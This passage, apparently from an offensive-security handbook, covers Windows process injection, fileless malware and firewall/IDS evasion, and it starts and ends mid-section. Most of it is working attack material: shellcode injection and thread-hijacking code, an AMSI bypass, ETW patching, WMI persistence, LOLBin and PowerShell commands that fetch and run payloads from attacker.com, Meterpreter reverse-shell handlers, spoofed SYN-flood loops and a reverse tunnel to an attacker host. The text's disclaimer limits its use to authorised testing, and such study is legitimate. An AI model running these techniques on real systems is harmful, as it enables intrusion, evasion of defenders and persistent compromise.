**Detection vectors**: EDR monitors `CreateRemoteThread` from unusual sources, especially targeting system processes.

**2. QueueUserAPC Injection**

Queues Asynchronous Procedure Call to existing thread:

```c
// Enumerate threads in target process
HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
THREADENTRY32 te32;

// For each thread, queue APC
while (Thread32Next(hThreadSnapshot, &te32)) {
    if (te32.th32OwnerProcessID == dwTargetPID) {
        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
        QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)pRemoteMemory);
        CloseHandle(hThread);
    }
}
```

**Advantage**: Less suspicious than creating new threads. **Limitation**: Requires target thread to enter alertable state.

**3. Reflective DLL Injection**

DLL loads itself without calling `LoadLibrary`, avoiding disk writes and standard loader:

```c
// Manually map PE sections
// Resolve imports manually
// Fix relocations
// Execute entry point (DllMain)
```

**sRDI (Shellcode Reflective DLL Injection)** - Converts DLL to position-independent shellcode:

```bash
# Generate reflective DLL shellcode
python sRDI.py malicious.dll -f FunctionName -o output.bin
```

**4. Process Doppelgänging**

Abuses NTFS transactions to load code:

```
1. Create transaction
2. Write malicious executable to file in transaction
3. Create memory section from transacted file
4. Rollback transaction (file disappears from disk)
5. Create process from memory section
```

**[Inference]** Process Doppelgänging bypasses many AV file scanners since malicious code never exists on disk outside transaction.

**ProcessDoppelganging tool** (proof of concept):

```bash
ProcessDoppelganging.exe C:\Windows\System32\calc.exe C:\path\to\payload.exe
```

#### Modern EDR-Resistant Techniques

**Module Overloading**: Overwrite legitimate DLL code sections in memory rather than injecting new modules.

**Thread Hijacking**:

```c
// Suspend target thread
SuspendThread(hThread);

// Get thread context
GetThreadContext(hThread, &ctx);

// Allocate shellcode in target process
VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, pRemoteMemory, shellcode, shellcodeSize, NULL);

// Modify instruction pointer to shellcode
ctx.Rip = (DWORD64)pRemoteMemory;  // x64 example
SetThreadContext(hThread, &ctx);

// Resume thread
ResumeThread(hThread);
```

**Function Stomping**: Overwrite the beginning of legitimate function with JMP to malicious code.

#### Tools for DLL Injection

**Injector tools**:

```bash
# Cobalt Strike beacon injection
beacon> inject <pid> x64 <listener>

# PowerSploit Invoke-DllInjection
Import-Module PowerSploit
Invoke-DllInjection -ProcessID 1234 -Dll C:\path\to\payload.dll
```

**DLL Injection frameworks**:

- **Donut**: Creates position-independent shellcode from .NET assemblies, EXE, DLL
    
    ```bash
    donut -f malicious.exe -a 2 -o payload.bin
    ```
    
- **ProcessInjection (PowerShell Empire module)**:
    
    ```powershell
    Invoke-ProcessInjection -ProcId 1234 -Shellcode $buf
    ```
    

### Memory-Only Malware

Fileless or memory-only malware executes entirely in RAM without writing to disk, evading file-based detection.

#### In-Memory Execution Techniques

**1. PowerShell In-Memory Loading**

```powershell
# Download and execute PE in memory
$webclient = New-Object System.Net.WebClient
$url = "http://attacker.com/payload.exe"
$bytes = $webclient.DownloadData($url)

# Reflectively load PE
[System.Reflection.Assembly]::Load($bytes)
[Namespace.Class]::Main()
```

**Invoke-ReflectivePEInjection** (PowerSploit):

```powershell
Invoke-ReflectivePEInjection -PEBytes $bytes -ForceASLR
```

**2. .NET Assembly Loading**

```csharp
// Load assembly from byte array
byte[] assemblyBytes = /* download or embed */;
Assembly assembly = Assembly.Load(assemblyBytes);

// Execute entry point
MethodInfo method = assembly.EntryPoint;
method.Invoke(null, null);
```

**execute-assembly** (Cobalt Strike):

```bash
beacon> execute-assembly /path/to/assembly.exe arguments
```

**3. Inline Assembly / Direct Shellcode Execution**

```c
// Allocate RWX memory
LPVOID execMemory = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// Copy shellcode
memcpy(execMemory, shellcode, shellcodeSize);

// Execute via function pointer
((void(*)())execMemory)();
```

**Modern evasion**: Allocate as RW, write shellcode, change to RX with `VirtualProtect` (avoids suspicious RWX memory).

#### Delivery Mechanisms for Memory-Only Execution

**1. Living-off-the-Land Binaries (LOLBins)**

Execute code using trusted Windows binaries:

```powershell
# regsvr32 for DLL execution
regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll

# mshta for HTA execution
mshta.exe http://attacker.com/payload.hta

# rundll32 for JavaScript execution
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -enc <base64>")
```

**2. WMI Event Subscriptions**

Persist and execute without files:

```powershell
# Create event filter
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "SystemFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Create consumer (payload)
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "SystemConsumer"
    CommandLineTemplate = "powershell.exe -enc <base64_payload>"
}

# Bind filter to consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

**3. Process Memory Injection Chains**

Staged approach:

```
1. Benign process starts (e.g., PowerShell, legitimate signed binary)
2. Small loader downloads stage 2 into memory
3. Stage 2 reflectively loads full payload
4. Payload migrates to another process via injection
```

**Metasploit stageless vs staged payloads**:

```bash
# Staged (smaller initial footprint, requires callback)
windows/meterpreter/reverse_https

# Stageless (entire payload in memory immediately)
windows/meterpreter_reverse_https
```

#### EDR Evasion Strategies for Memory-Only Malware

**Sleep obfuscation**:

```c
// Before sleeping, encrypt memory region
// After waking, decrypt and continue
// Evades memory scanners during sleep periods
```

**Module masquerading**:

```c
// Modify PEB (Process Environment Block) to hide loaded modules
// Remove malicious DLL from InMemoryOrderModuleList
```

**Stack encryption**: Encrypt call stack when not actively executing to hide from stack walking EDR techniques.

**AMSI bypass** (Anti-Malware Scan Interface for PowerShell/script scanning):

```powershell
# Common AMSI bypass (patch amsi.dll in memory)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**[Unverified]** AMSI bypasses are heavily signatured. Obfuscation and custom bypass techniques are necessary for evasion against updated EDR.

**ETW (Event Tracing for Windows) patching**:

```c
// Patch EtwEventWrite to prevent telemetry
unsigned char patch[] = { 0xC3 };  // RET instruction
WriteProcessMemory(GetCurrentProcess(), EtwEventWrite, patch, sizeof(patch), NULL);
```

#### Memory-Only Malware Frameworks

**Donut** - In-memory .NET/PE loader:

```bash
# Generate shellcode from EXE/DLL
donut.exe -a 2 -f malicious.exe -o payload.bin

# Execute with loader
loader.exe payload.bin
```

**Cobalt Strike** - Memory-resident beacon:

```bash
# Generate beacon DLL
generate beacon.dll

# Inject into process memory
inject <pid> x64 <listener>
```

**Metasploit** - In-memory Meterpreter:

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST <attacker-ip>
set LPORT 443
exploit

# After session, migrate to system process
migrate <pid>
```

**Invoke-Obfuscation** - PowerShell obfuscation to evade signature detection:

```powershell
Import-Module Invoke-Obfuscation.psd1
Invoke-Obfuscation
# Interactive menu for encoding, compression, and obfuscation
```

### Detection and Analysis Considerations

When testing evasion techniques, verify effectiveness using:

**Monitoring tools**:

- **Process Explorer** (Sysinternals): Detect unsigned/hidden DLLs, memory analysis
- **Process Hacker**: Advanced memory analysis, handle viewing
- **pe-sieve**: Detect hollowed processes, reflective injections
- **Moneta**: Memory analysis tool for detecting hidden code

**EDR simulation**: Test against real EDR solutions in authorized lab environments:

- Microsoft Defender for Endpoint
- CrowdStrike Falcon
- SentinelOne
- Carbon Black

**[Inference]** Most CTF environments don't have enterprise EDR, but understanding detection helps develop realistic evasion for authorized engagements.

### Ethical and Legal Constraints

**Critical reminder**: These techniques are designed for:

- Authorized penetration testing with written permission
- CTF competitions with explicit rules allowing such techniques
- Security research in isolated lab environments
- Red team exercises with organizational approval

**Unauthorized use constitutes criminal activity** under laws including the Computer Fraud and Abuse Act (CFAA) in the US and similar statutes internationally.

---

**Recommended Related Topics**:

- Privilege Escalation Post-Injection (token manipulation, UAC bypass)
- Payload Obfuscation and Encryption Techniques
- Advanced Persistence Mechanisms (Registry, WMI, Scheduled Tasks)
- Network-Level Evasion (C2 traffic obfuscation, domain fronting)

---

## Firewall & IDS/IPS Evasion

### Fragmentation

Fragmentation techniques split network packets into smaller pieces to evade detection systems that cannot properly reassemble or inspect fragmented traffic.

#### IP Fragmentation Basics

IP fragmentation occurs when packets exceed the Maximum Transmission Unit (MTU) of a network link. Attackers exploit this by deliberately fragmenting packets to:

- Split malicious payloads across multiple fragments
- Bypass signature-based detection that requires complete packet inspection
- Exploit reassembly vulnerabilities in security devices

**Key IP Header Fields:**

- Identification (16-bit): Groups fragments belonging to the same packet
- Flags: Don't Fragment (DF), More Fragments (MF)
- Fragment Offset (13-bit): Position of fragment in original packet

#### Nmap Fragmentation Options

```bash
# Fragment packets into 8-byte chunks
nmap -f target.com

# Fragment packets into 16-byte chunks
nmap -ff target.com

# Custom MTU (must be multiple of 8)
nmap --mtu 24 target.com

# Combine with other evasion techniques
nmap -f -sS -p- --randomize-hosts target.com
```

**How it works:** The `-f` option fragments TCP header and data into smaller IP packets. Many older IDS/IPS systems fail to reassemble fragments correctly, missing attack signatures.

[Inference] Modern security devices typically handle standard fragmentation well; effectiveness depends on target infrastructure age and configuration.

#### TCP Fragmentation with Hping3

```bash
# Send fragmented SYN packets
hping3 -S -f target.com -p 80

# Fragment with specific offset
hping3 -S -f -o 16 target.com -p 80

# Overlapping fragments (potential IDS evasion)
hping3 -S -f -g 16 target.com -p 80
```

**Overlapping Fragment Attacks:**

```bash
# Send overlapping fragments with conflicting data
# Fragment 1: offset 0, length 20, contains benign data
# Fragment 2: offset 10, length 20, contains malicious payload

hping3 --rawip --ipproto 6 -d 20 -f -o 0 target.com
hping3 --rawip --ipproto 6 -d 20 -f -o 10 target.com
```

Different operating systems handle overlapping fragments differently (BSD vs Linux vs Windows reassembly), potentially causing IDS and endpoint to interpret packets differently.

#### Fragroute for Advanced Fragmentation

```bash
# Install fragroute (Debian/Kali)
apt-get install fragroute

# Configuration file example (fragroute.conf)
cat > fragroute.conf << EOF
# Fragment packets into 8-byte chunks
ip_frag 8

# Add delay between fragments
delay 100

# Duplicate fragments
dup

# Drop fragments randomly
drop 10%
EOF

# Route traffic through fragroute
fragroute -f fragroute.conf target.com
```

**Fragroute Advanced Techniques:**

```bash
# Segment TCP stream
tcp_seg 4 new

# Chaff fragments (send junk fragments)
ip_chaff dup

# Fragment and reorder
ip_frag 16
order random
```

#### Scapy for Custom Fragmentation

```python
from scapy.all import *

# Create fragmented packets manually
packet = IP(dst="target.com")/TCP(dport=80,flags="S")/"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"

# Fragment packet
fragments = fragment(packet, fragsize=8)

# Send fragments
for frag in fragments:
    send(frag)

# Overlapping fragments with different payloads
frag1 = IP(dst="target.com", flags="MF", frag=0)/TCP(dport=80)/"AAAAAAAA"
frag2 = IP(dst="target.com", frag=1)/("BBBBBBBB")
send([frag1, frag2])

# Tiny fragments (fragment offset manipulation)
tiny_frag = IP(dst="target.com", flags="MF", frag=0, ihl=5)/TCP(dport=80, sport=12345)
send(tiny_frag)
```

#### IPv6 Fragmentation

IPv6 handles fragmentation differently—only the source can fragment, not intermediate routers:

```bash
# Nmap IPv6 fragmentation
nmap -6 -f target.com

# Hping3 IPv6 fragments
hping3 -6 -f target.com -p 80
```

**IPv6 Fragment Header Evasion:**

```python
from scapy.all import *

# IPv6 with fragment extension header
packet = IPv6(dst="2001:db8::1")/IPv6ExtHdrFragment()/TCP(dport=80,flags="S")
send(packet)

# Multiple extension headers (evasion via header chain complexity)
packet = IPv6(dst="2001:db8::1")/IPv6ExtHdrDestOpt()/IPv6ExtHdrFragment()/IPv6ExtHdrRouting()/TCP(dport=80)
send(packet)
```

[Unverified] Some IDS/IPS systems limit IPv6 extension header chain depth inspection, potentially allowing evasion through excessive chaining.

#### Defragmentation Evasion

**Timeout Manipulation:**

```python
# Send fragments with delays exceeding reassembly timeout
from scapy.all import *
import time

frags = fragment(IP(dst="target.com")/TCP(dport=80)/"payload", fragsize=8)
for i, frag in enumerate(frags):
    send(frag)
    if i < len(frags)-1:
        time.sleep(65)  # Exceed typical 60s reassembly timeout
```

**Out-of-Order Delivery:**

```python
# Send fragments in reverse order
frags = fragment(IP(dst="target.com")/TCP(dport=80)/"malicious_payload", fragsize=8)
for frag in reversed(frags):
    send(frag)
```

### Protocol Anomalies

Protocol anomalies exploit edge cases, malformed packets, and non-standard implementations to evade detection or exploit parsing differences between security devices and target systems.

#### TCP Flag Manipulation

**Invalid Flag Combinations:**

```bash
# NULL scan (no flags set) - bypasses some stateful firewalls
nmap -sN target.com

# FIN scan (unexpected FIN without connection)
nmap -sF target.com

# Xmas scan (FIN, PSH, URG flags set)
nmap -sX target.com

# Custom flag combinations with hping3
hping3 -F -P -U target.com -p 80  # FIN+PSH+URG
hping3 -A -R target.com -p 80     # ACK+RST (invalid)
hping3 -S -F target.com -p 80     # SYN+FIN (invalid)
```

**How NULL/FIN/Xmas work:** RFC 793 states that closed ports should respond with RST to unexpected packets, while open ports should drop them. Firewalls may not inspect these unusual flag combinations.

[Inference] Effectiveness varies significantly by target OS; Windows systems typically respond differently than RFC-compliant Unix/Linux systems.

#### TCP Options Manipulation

```bash
# Custom TCP options with hping3
hping3 -S --tcp-timestamp target.com -p 80

# Malformed TCP options
hping3 -S --tcpopt "W" target.com  # Invalid option

# Scapy custom TCP options
packet = IP(dst="target.com")/TCP(dport=80, options=[('MSS', 1460), ('NOP', None), ('Timestamp', (12345, 0))])
send(packet)
```

**TCP Window Size Manipulation:**

```bash
# Zero window size
hping3 -S -w 0 target.com -p 80

# Maximum window size
hping3 -S -w 65535 target.com -p 80
```

Some firewalls use window size for OS fingerprinting and may whitelist/blacklist based on values.

#### Sequence Number Manipulation

```python
from scapy.all import *

# Random sequence numbers
packet = IP(dst="target.com")/TCP(dport=80, seq=RandInt(), flags="S")
send(packet)

# Sequence number wraparound exploitation
initial_seq = 4294967290  # Near 32-bit max
packet = IP(dst="target.com")/TCP(dport=80, seq=initial_seq, flags="S")
send(packet)
```

#### Checksum Manipulation

```bash
# Bad checksum (some IDS skip processing invalid checksums)
nmap --badsum target.com

# Hping3 with bad checksums
hping3 -S --badcksum target.com -p 80
```

**Scapy checksum evasion:**

```python
# Manually set incorrect checksum
packet = IP(dst="target.com")/TCP(dport=80, flags="S", chksum=0x1234)
send(packet, verbose=1)

# Force checksum calculation
packet = IP(dst="target.com")/TCP(dport=80, flags="S")
del packet[TCP].chksum
send(packet)
```

[Unverified] Some IDS/IPS implementations may skip deep inspection on packets with invalid checksums to improve performance, though modern devices typically validate checksums.

#### TTL Manipulation

```bash
# Low TTL to expire before reaching IDS but after firewall
hping3 -S -t 3 target.com -p 80

# High TTL
hping3 -S -t 255 target.com -p 80

# Nmap TTL options
nmap --ttl 128 target.com
```

**TTL-based IDS Evasion:**

```python
# Send decoy packets with low TTL to confuse IDS
decoy = IP(dst="target.com", ttl=5)/TCP(dport=80, flags="S")/"malicious"
real = IP(dst="target.com", ttl=64)/TCP(dport=80, flags="S")/"benign"
send([decoy, real])
```

If IDS is positioned further in the network path, the low-TTL decoy expires before reaching IDS, but IDS sees the benign packet.

#### IP Options Evasion

```bash
# Source routing (specify route through network)
nmap --ip-options "L 192.168.1.1 192.168.2.1" target.com

# Record route
nmap --ip-options "R" target.com

# Hping3 with IP options
hping3 -S --ipopt "LSRR 192.168.1.1" target.com -p 80
```

**Loose Source Routing (LSRR):**

```python
from scapy.all import *

# Force packet through specific routers
packet = IP(dst="target.com", options=[IPOption_LSRR(routers=["192.168.1.1", "10.0.0.1"])])/TCP(dport=80, flags="S")
send(packet)
```

[Inference] Most modern networks drop or reject source-routed packets due to security policies, but legacy systems may still process them.

#### Protocol Number Manipulation

```python
# Use uncommon protocol numbers
packet = IP(dst="target.com", proto=99)/Raw(load="data")  # Protocol 99 is unassigned
send(packet)

# GRE encapsulation for tunneling
packet = IP(dst="target.com")/GRE()/IP(dst="internal.target")/TCP(dport=445)
send(packet)
```

#### DNS Protocol Anomalies

```bash
# DNS queries with unusual parameters
dig @target.com +edns=4096 +dnssec +tcp domain.com

# NULL queries
dig @target.com -t NULL domain.com

# Unusual DNS opcodes
```

**DNS Tunneling Detection Evasion:**

```python
from scapy.all import *

# Randomize subdomain lengths
dns = IP(dst="dns-server")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="aabbccdd.example.com"))
send(dns)

# Use TXT records for data exfiltration
dns = IP(dst="dns-server")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qtype="TXT", qname="data.example.com"))
send(dns)
```

#### HTTP Protocol Anomalies

```bash
# Case variation in methods
echo -e "get / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80

# Method variation
echo -e "HEAD / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80

# HTTP version manipulation
curl -H "Host: target.com" --http0.9 http://target.com
curl -H "Host: target.com" --http2 http://target.com

# Header case manipulation (WAF evasion)
curl -H "host: target.com" -H "user-agent: Mozilla" http://target.com
curl -H "HOST: target.com" -H "USER-AGENT: Mozilla" http://target.com
```

**Path Obfuscation:**

```bash
# URL encoding
curl http://target.com/%2e%2e%2f%2e%2e%2fadmin

# Double encoding
curl http://target.com/%252e%252e%252fadmin

# Unicode encoding
curl http://target.com/%c0%af

# Path traversal with various separators
curl http://target.com/..;/..;/admin
curl http://target.com/..%5c..%5cadmin
```

### Slow Scanning

Slow scanning techniques spread reconnaissance activities over extended time periods to avoid threshold-based detection and rate-limiting mechanisms.

#### Timing Templates in Nmap

```bash
# Paranoid timing (5 minutes between probes)
nmap -T0 target.com

# Sneaky timing (15 seconds between probes)
nmap -T1 target.com

# Polite timing (0.4 seconds between probes)
nmap -T2 target.com

# Normal timing (default)
nmap -T3 target.com

# Aggressive timing
nmap -T4 target.com

# Insane timing
nmap -T5 target.com
```

**Custom Timing Parameters:**

```bash
# Minimum delay between probes (milliseconds)
nmap --scan-delay 5s target.com

# Maximum delay between probes
nmap --max-scan-delay 10s target.com

# Minimum packet rate (packets per second)
nmap --min-rate 1 target.com

# Maximum packet rate
nmap --max-rate 10 target.com

# Maximum retries
nmap --max-retries 1 target.com

# Host timeout
nmap --host-timeout 30m target.com
```

#### Distributed Scanning

**Decoy Scanning:**

```bash
# Use decoy IP addresses
nmap -D RND:10 target.com  # 10 random decoys

# Specific decoy IPs
nmap -D 192.168.1.5,192.168.1.6,ME,192.168.1.7 target.com

# Zombie/Idle scan (uses third party for scanning)
nmap -sI zombie-host target.com
```

The idle scan exploits predictable IP ID sequences on the zombie host to infer port states without sending packets from your IP.

**Source IP Spoofing:**

```bash
# Spoof source IP (requires raw socket access)
hping3 -S -a 192.168.1.100 target.com -p 80

# Rotate source IPs
for ip in 192.168.1.{1..254}; do
    hping3 -S -a $ip target.com -p 80 -c 1
    sleep 60
done
```

[Inference] IP spoofing effectiveness is limited by network egress filtering and the inability to receive response packets at the spoofed address.

#### Source Port Manipulation

```bash
# Use common source ports (often whitelisted)
nmap --source-port 53 target.com  # DNS
nmap --source-port 80 target.com  # HTTP
nmap --source-port 443 target.com  # HTTPS

# Hping3 source port
hping3 -S -s 53 target.com -p 80
```

**Rationale:** Some firewalls allow return traffic from specific source ports (DNS 53, HTTP 80) assuming they're responses to legitimate outbound queries.

#### Randomization Techniques

```bash
# Randomize target order
nmap --randomize-hosts target1.com target2.com target3.com

# Random data in packets
nmap --data-length 25 target.com

# Append random data
nmap --data-string "RandomData123" target.com
```

**Scapy Randomization:**

```python
from scapy.all import *
import random
import time

targets = ["target1.com", "target2.com", "target3.com"]
ports = [80, 443, 22, 21, 25]

for _ in range(100):
    target = random.choice(targets)
    port = random.choice(ports)
    
    packet = IP(dst=target)/TCP(dport=port, flags="S")
    send(packet, verbose=0)
    
    # Random delay between 30-120 seconds
    time.sleep(random.randint(30, 120))
```

#### Long-Duration Scanning Strategies

**Daily Port Scanning Script:**

```bash
#!/bin/bash
# Scan one port per day across multiple targets

TARGET_FILE="targets.txt"
PORT_RANGE="1-65535"

for port in $(seq 1 65535); do
    while read target; do
        nmap -p $port -sS $target -oA scan_${target}_${port}
        sleep $((RANDOM % 3600 + 3600))  # Random 1-2 hour delay
    done < $TARGET_FILE
    
    # Wait 24 hours before next port
    sleep 86400
done
```

**Weekly Reconnaissance:**

```python
import nmap
import time
from datetime import datetime

nm = nmap.PortScanner()
targets = ['target1.com', 'target2.com']

# Scan one target per week
for target in targets:
    print(f"[{datetime.now()}] Scanning {target}")
    
    # Extremely slow scan
    nm.scan(hosts=target, arguments='-sS -T0 -p- --max-rate 1')
    
    # Save results
    with open(f'scan_{target}_{datetime.now().strftime("%Y%m%d")}.txt', 'w') as f:
        f.write(nm.csv())
    
    # Wait 7 days
    time.sleep(604800)
```

#### Protocol-Specific Slow Scanning

**HTTP Slow Scanning:**

```bash
# Slowloris-style slow requests (connection exhaustion, but also evasion)
hping3 -S -p 80 --flood -d 120 --rand-source target.com

# Very slow HTTP requests
echo -e "GET / HTTP/1.1\r\nHost: target.com\r\n" | nc -w 600 target.com 80
```

**DNS Slow Enumeration:**

```bash
#!/bin/bash
# Slow subdomain enumeration

DOMAIN="target.com"
WORDLIST="subdomains.txt"

while read subdomain; do
    dig @8.8.8.8 ${subdomain}.${DOMAIN} +short
    # Random delay 5-15 minutes
    sleep $((RANDOM % 600 + 300))
done < $WORDLIST
```

**SMB Slow Enumeration:**

```bash
# Enumerate SMB shares with long delays
for host in $(cat targets.txt); do
    smbclient -L //$host -N
    sleep 3600  # 1 hour delay between hosts
done
```

#### Distributed Scanning with Multiple Sources

**Tor-based Distributed Scanning:**

```bash
# Route nmap through Tor
proxychains nmap -sT -Pn -p 80,443 target.com

# Configure proxychains with multiple Tor circuits
# /etc/proxychains.conf
# [ProxyList]
# socks5 127.0.0.1 9050
# socks5 127.0.0.1 9051
# socks5 127.0.0.1 9052
```

**VPN Rotation Script:**

```bash
#!/bin/bash
VPN_CONFIGS=(/etc/openvpn/vpn1.conf /etc/openvpn/vpn2.conf /etc/openvpn/vpn3.conf)

for config in "${VPN_CONFIGS[@]}"; do
    # Connect to VPN
    openvpn --config $config --daemon
    sleep 30
    
    # Perform scan
    nmap -sS -p- target.com -oA scan_$(date +%s)
    
    # Disconnect
    killall openvpn
    
    # Wait before next VPN
    sleep 3600
done
```

#### Cloud-Based Distributed Scanning

```python
# AWS Lambda pseudo-code for distributed scanning
import boto3
import nmap
import time

def lambda_handler(event, context):
    target = event['target']
    port_range = event['port_range']
    
    nm = nmap.PortScanner()
    nm.scan(hosts=target, ports=port_range, arguments='-sS -T2')
    
    # Upload results to S3
    s3 = boto3.client('s3')
    s3.put_object(
        Bucket='scan-results',
        Key=f'scan_{target}_{time.time()}.json',
        Body=nm.csv()
    )
    
    return {'statusCode': 200, 'body': 'Scan complete'}

# Trigger multiple Lambda functions from different regions
# Each Lambda scans from different source IP
```

[Unverified] Cloud provider terms of service typically prohibit port scanning; using cloud infrastructure for reconnaissance may violate agreements and result in account termination.

#### Rate Limiting Evasion

**Adaptive Rate Limiting:**

```python
from scapy.all import *
import time

def adaptive_scan(target, ports):
    delay = 1  # Initial delay in seconds
    max_delay = 60
    
    for port in ports:
        packet = IP(dst=target)/TCP(dport=port, flags="S")
        response = sr1(packet, timeout=2, verbose=0)
        
        # If no response, might be rate limited
        if response is None:
            delay = min(delay * 2, max_delay)
            print(f"Possible rate limit detected, increasing delay to {delay}s")
        else:
            # Successful response, try speeding up
            delay = max(delay * 0.9, 0.1)
        
        time.sleep(delay)

adaptive_scan("target.com", range(1, 1001))
```

#### Monitoring and Detection Avoidance

**Log Correlation Evasion:**

```bash
# Spread scans across different protocols and times
# Day 1: HTTP reconnaissance
nmap -p 80,443 --script http-enum target.com -T1

# Day 2: SMTP enumeration  
nmap -p 25 --script smtp-enum-users target.com -T1

# Day 3: DNS queries
fierce --domain target.com --delay 300

# Day 4: SSL/TLS analysis
nmap -p 443 --script ssl-enum-ciphers target.com -T1
```

**Session Fragmentation:**

```python
# Split reconnaissance across multiple short sessions
import time
import random

def fragmented_recon(target, total_ports=1000, session_size=10):
    """Scan in small chunks across many sessions"""
    ports = list(range(1, total_ports + 1))
    random.shuffle(ports)
    
    for i in range(0, len(ports), session_size):
        session_ports = ports[i:i+session_size]
        
        # Scan small batch
        for port in session_ports:
            packet = IP(dst=target)/TCP(dport=port, flags="S")
            send(packet, verbose=0)
            time.sleep(random.randint(5, 15))
        
        # Long break between sessions (hours)
        print(f"Session complete. Waiting {3600} seconds...")
        time.sleep(3600)

fragmented_recon("target.com")
```

---

**Key Recommendations for Further Study:**

- **Application-Layer Evasion**: WAF bypass techniques, encoding variations, SQL injection evasion
- **IDS/IPS Signatures**: Understanding Snort/Suricata rule syntax to craft evasive payloads
- **Network Protocols**: Deep dive into TCP/IP stack implementation differences across operating systems for evasion opportunities

---

### Decoy Traffic

Decoy traffic obscures the true source of scans and attacks by generating false positives, overwhelming detection systems, or blending malicious activity with benign patterns.

**Nmap Decoy Scanning:**

```bash
# Basic decoy scan with random IPs
nmap -D RND:10 <target>

# Specific decoy addresses
nmap -D decoy1,decoy2,decoy3,ME <target>

# Position your real IP among decoys (ME specifies your position)
nmap -D 192.168.1.5,192.168.1.6,ME,192.168.1.8 <target>

# Decoy scan with service detection
nmap -sS -sV -D RND:5 <target>

# Decoy with fragmentation
nmap -D RND:10 -f <target>

# Full stealth scan with decoys
nmap -sS -T2 -D RND:8 --randomize-hosts -p- <target>
```

**IP Spoofing Techniques:**

```bash
# hping3 for spoofed SYN floods
hping3 -S -a <spoofed_source_ip> -p <port> <target>

# Multiple random source addresses
hping3 -S --rand-source -p <port> <target>

# Spoofed with specific source port
hping3 -S -a <spoofed_ip> -s 53 -p <port> <target>

# SYN flood from multiple sources
for i in {1..254}; do
    hping3 -S -a 192.168.1.$i -p 80 <target> -c 1 &
done
```

**Scapy-Based Custom Decoy Traffic:**

```python
from scapy.all import *
import random

# Generate decoy SYN packets
target = "192.168.1.100"
real_src = "192.168.1.50"
decoys = ["10.0.0.1", "10.0.0.2", "10.0.0.3", "172.16.0.1"]

# Mix real scan with decoys
for port in [80, 443, 22]:
    # Send from decoys
    for decoy in decoys:
        packet = IP(src=decoy, dst=target)/TCP(dport=port, flags="S")
        send(packet, verbose=0)
    
    # Send real scan
    packet = IP(src=real_src, dst=target)/TCP(dport=port, flags="S")
    response = sr1(packet, timeout=1, verbose=0)
    
    if response and response.haslayer(TCP):
        if response[TCP].flags == "SA":
            print(f"Port {port} open")

# Random timing between packets
    time.sleep(random.uniform(0.1, 2.0))
```

**Traffic Noise Generation:**

```bash
# Generate benign HTTP traffic alongside attacks
while true; do
    curl -s http://<target>/legitimate-page > /dev/null
    sleep $((RANDOM % 10))
done &

# DNS query noise
while true; do
    dig @<target_dns> random$RANDOM.example.com
    sleep $((RANDOM % 5))
done &

# ICMP decoy traffic
fping -g 192.168.1.0/24 -c 1 -q &
```

**Metasploit Decoy Configuration:**

```bash
# Launch msfconsole
msfconsole

# Use auxiliary scanner with decoys
use auxiliary/scanner/portscan/tcp
set RHOSTS <target>
set THREADS 10
set PORTS 1-1000

# [Inference]: Metasploit doesn't have native decoy routing like Nmap
# Decoys require external traffic generation or network-level manipulation
```

**MAC Address Randomization:**

```bash
# Change MAC before scanning
ifconfig eth0 down
macchanger -r eth0
ifconfig eth0 up

# Automated MAC rotation during scan
for i in {1..10}; do
    macchanger -r eth0
    nmap -sS -p 80 <target>
    sleep 30
done
```

**Timing and Pattern Obfuscation:**

```bash
# Slow scan with random timing
nmap -T2 --scan-delay 5s --max-rate 1 <target>

# Random host order
nmap --randomize-hosts -iL targets.txt

# Split scan across time windows
nmap -p 1-1000 <target>     # First batch
sleep 3600                   # Wait 1 hour
nmap -p 1001-2000 <target>  # Second batch

# Variable packet rates
nmap --max-rate 10 -p 1-100 <target>
nmap --max-rate 100 -p 101-200 <target>
```

### Tunnel Creation

Tunneling encapsulates traffic within permitted protocols to bypass firewall rules and evade detection by appearing as legitimate traffic.

**SSH Tunneling:**

```bash
# Local port forward (access remote service locally)
ssh -L <local_port>:<target_host>:<target_port> user@<jump_host>
ssh -L 8080:192.168.1.100:80 user@jump.example.com

# Remote port forward (expose local service remotely)
ssh -R <remote_port>:localhost:<local_port> user@<remote_host>
ssh -R 8080:localhost:80 user@attacker.example.com

# Dynamic SOCKS proxy
ssh -D 9050 user@<jump_host>

# Use SOCKS proxy with tools
proxychains nmap -sT -Pn <target>
proxychains curl http://<internal_target>

# Multi-hop SSH tunnel
ssh -J user1@hop1,user2@hop2 user3@final_target

# Persistent tunnel with autossh
autossh -M 0 -f -N -D 9050 user@<jump_host>
```

**SSH Tunnel Configuration Files:**

```bash
# ~/.ssh/config for persistent tunnels
Host jump
    HostName jump.example.com
    User username
    LocalForward 8080 192.168.1.100:80
    LocalForward 8443 192.168.1.100:443
    DynamicForward 9050
    ServerAliveInterval 60
    ServerAliveCountMax 3

# Connect using config
ssh jump
```

**HTTP/HTTPS Tunneling:**

```bash
# Chisel - Fast TCP/UDP tunnel over HTTP
# On attacker machine (server)
chisel server -p 8080 --reverse

# On compromised target (client)
chisel client <attacker_ip>:8080 R:socks

# Use the SOCKS proxy
